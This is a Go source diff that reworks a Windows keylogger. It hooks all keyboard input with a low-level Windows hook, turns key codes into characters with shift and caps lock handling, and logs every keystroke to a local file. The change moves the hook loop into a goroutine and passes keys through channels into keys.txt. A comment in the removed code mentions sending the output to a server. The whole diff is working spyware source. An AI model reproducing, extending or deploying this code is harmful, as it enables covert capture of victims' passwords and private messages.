@@ -2,10 +2,8 @@ package main
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"syscall"
-	"time"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
@@ -23,7 +21,7 @@ var (
 	hook HHOOK
 )
 
-var asciiMap = map[int]string{
+var asciiMap = map[uint32]string{
 	32:  " ",
 	8:   " BSPACE ",
 	48:  "0",
@@ -118,8 +116,6 @@ type MSG struct {
 	LPrivate uint32
 }
 
-var file *os.File
-
 func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32) HHOOK {
 	ret, _, _ := procSetWindowsHookExW.Call(uintptr(idHook), lpfn, hmod, uintptr(dwThreadId))
 	return HHOOK(ret)
@@ -139,31 +135,18 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 			// Check for shift and caps lock states
 			shiftPressed := (getKeyState(160)&0x8000) != 0 || (getKeyState(161)&0x8000) != 0
 			capsLockOn := (getKeyState(20) & 0x0001) != 0
-
-			value, exists := asciiMap[int(vkCode)]
-			var output string
-			if exists {
-				if shiftPressed && !capsLockOn {
-					value = transform(value, shiftPressed)
-				} else if capsLockOn && !shiftPressed {
-					value = transform(value, capsLockOn)
-				}
-				output = fmt.Sprintf("%s (0x%04X)", value, vkCode)
+			value := asciiMap[vkCode]
+			if shiftPressed || capsLockOn {
+				value = transform(value, shiftPressed)
+				valueChan <- value
+				vkodeChan <- vkCode
 			} else {
-				output = fmt.Sprintf("Unknown (0x%04X)", vkCode)
-			}
-
-			// Write to file
-			if file != nil {
-				if _, err := file.WriteString(fmt.Sprintf("%v : %v\n", time.Now(), output)); err != nil {
-					log.Printf("Error writing to file: %v", err)
-				}
-			} else {
-				log.Println("File handle is nil. Cannot write to file.")
+				value = transform(value, false)
+				valueChan <- value
+				vkodeChan <- vkCode
 			}
 		}
 	}
-
 	return CallNextHookEx(hook, nCode, wParam, lParam)
 }
 
@@ -220,17 +203,32 @@ func UnhookWindowsHookEx(hhk HHOOK) bool {
 	return ret != 0
 }
 
-func main() {
-	outputFile := "keyfile.txt" //output file goes here or server stuff
-	file, _ = os.Create(outputFile)
-	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
+var valueChan = make(chan string)
+var vkodeChan = make(chan uint32)
 
-	var msg MSG
-	for {
-		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
-		if r == 0 {
-			break
+func main() {
+	go func() {
+		hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
+		hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
+		var msg MSG
+		for {
+			r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
+			if r == 0 {
+				break
+			}
 		}
+	}()
+
+	file, err := os.Create("keys.txt")
+	if err != nil {
+		fmt.Println("Error creating file:", err)
+		return
 	}
+
+	for {
+		value := <-valueChan
+		vkCode := <-vkodeChan
+		fmt.Fprintf(file, "%s: %d\n", value, vkCode)
+	}
+
 }
